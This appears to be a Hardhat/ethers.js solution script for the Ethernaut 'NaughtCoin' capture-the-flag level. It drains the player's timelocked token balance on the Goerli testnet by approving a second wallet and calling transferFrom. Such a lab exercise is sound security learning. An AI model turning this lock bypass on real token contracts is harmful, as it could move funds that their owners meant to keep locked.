import { ethers } from "hardhat";

const approveNaughtCoin = async () => {
    // change naughtcoin instance address here
    const naughtCoinAddress = process.env.NAUGHTCOIN!;
    // change your player and spender address in the .env file
    const player = process.env.PRIVATE_KEY || "";
    const spender = process.env.PRIVATE_KEY_2 || "";
    // alternatively you can manually add addresses below:
    // const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
    // const spender = "0x5BDE7cAa4aF4C56A73a4bCBCC3760A76057dba4E";

    // Don't touch below 🚀
    // Vulnerability comes from an alternative way of transfering the token since it is an ERC20 compliant token.
    // Additional read to understand more:
    // https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md
    // https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol

    // using my custom rpc stored in .env (for privacy)
    // const provider = ethers.getDefaultProvider("goerli");
    const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
    const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
    const players = new ethers.Wallet(player, provider);
    const spenders = new ethers.Wallet(spender, provider);
    console.log("Player's address is: ", players.address);
    console.log("Spender's address is: ", spenders.address);

    // 1st part using player
    const IERC20 = await ethers.getContractAt("IERC20", naughtCoinAddress);
    const IERC20Player = IERC20.connect(players);
    let playerBalance = await IERC20Player.balanceOf(players.address);
    let spenderBalance = await IERC20Player.balanceOf(spenders.address);
    console.log(`Players Balance: ${playerBalance}`);
    console.log(`Spenders Balance: ${spenderBalance}`);
    console.log("Now approving Spender Address to spend Player's balance...");
    const tx = await IERC20.approve(spenders.address, playerBalance);
    const success = await tx.wait(1);
    console.log(success);
    const amountApproved = (await IERC20.allowance(players.address, spenders.address)).toString();
    console.log(`Amount approved for transfer: ${amountApproved}`);
    // 2nd part using spender
    console.log("Spender will now transfer the balance to itself...");
    const IERC20Spender = IERC20.connect(spenders);
    const tx2 = await IERC20Spender.transferFrom(players.address, spenders.address, playerBalance);
    const receipttx2 = await tx2.wait(1);
    console.log(receipttx2);
    console.log("Rechecking balances...");
    playerBalance = await IERC20Spender.balanceOf(players.address);
    spenderBalance = await IERC20Spender.balanceOf(spenders.address);
    console.log(`Players Balance: ${playerBalance}`);
    console.log(`Spenders Balance: ${spenderBalance}`);
    if (playerBalance < 1) {
        console.log("Congrats! Player balance is now 0, submit to ethernaut");
    } else {
        console.log("Player balance is not 0, Please review code above and try again...");
    }
};

approveNaughtCoin()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
